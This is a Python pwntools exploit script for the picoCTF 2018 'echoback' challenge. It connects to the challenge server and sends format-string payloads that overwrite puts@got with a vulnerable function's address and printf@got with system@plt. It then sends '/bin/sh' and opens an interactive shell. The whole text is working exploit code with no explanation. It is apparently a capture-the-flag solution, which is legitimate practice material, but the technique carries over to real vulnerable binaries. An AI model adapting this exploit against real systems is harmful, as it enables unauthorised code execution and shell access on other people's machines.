#!/usr/bin/python 
from pwn import *

#p = process("./echoback")
p = remote("2018shell3.picoctf.com", 26532)
elf = ELF("./echoback")
printf_got = elf.got['printf']
system_plt = elf.plt['system']
vuln = 0x8048643
puts_got = elf.got['puts']

# puts@got -> vuln
pay = p32(puts_got) #4byte(low)
pay += p32(puts_got+2) #4byte(high)
pay += '%{}x'.format(0x85AB-0x8) # puts@got low 2 byte
pay += '%7$hn'
pay += '%{}x'.format(0x10804-0x85AB) # puts@got high 2 byte
pay += '%8$hn'

p.sendlineafter("\n", pay)

# printf@got -> system@plt
pay = p32(printf_got)
pay += p32(printf_got+2)
pay += '%{}x'.format(0x8460-0x8)
pay += '%7$hn'
pay += '%{}x'.format(0x10804-0x8460)
pay += '%8$hn'

p.sendlineafter("\n", pay)

p.sendlineafter("\n", "/bin/sh\x00")

p.interactive()




